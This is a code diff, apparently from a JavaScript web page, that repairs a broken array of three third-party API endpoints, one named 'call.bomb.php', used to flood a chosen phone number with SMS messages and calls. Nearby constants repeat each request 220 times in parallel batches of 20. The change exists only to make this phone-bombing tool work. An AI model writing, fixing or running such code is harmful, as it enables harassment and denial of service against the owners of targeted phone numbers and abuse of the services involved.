@@ -294,9 +294,10 @@
 
         // ===== API Endpoints =====
         const PHONE_API_URLS = [
-            (phone) => `https://rootsmsapi.apurbax.com/KAMRUL/smsapi.php?phone=${encodeURIComponent(phone)}&api_key=ROOT-CYPHER-FREE`,
-            (number) => `https://sh-mh.site.je/call.bomb.php?number=${encodeURIComponent(number)}`https://api-modifyxhub.tech/custom.php?api_action=live-call&number=${encodeURIComponent(number)}
-        ];
+    (phone) => `https://rootsmsapi.apurbax.com/KAMRUL/smsapi.php?phone=${encodeURIComponent(phone)}&api_key=ROOT-CYPHER-FREE`,
+    (number) => `https://sh-mh.site.je/call.bomb.php?number=${encodeURIComponent(number)}`,
+    (number) => `https://api-modifyxhub.tech/custom.php?api_action=live-call&number=${encodeURIComponent(number)}`
+];
 
         const REPEAT_COUNT = 220; // per URL per request iteration
         const BATCH_SIZE = 20;    // parallel requests per batch (prevents browser freeze)
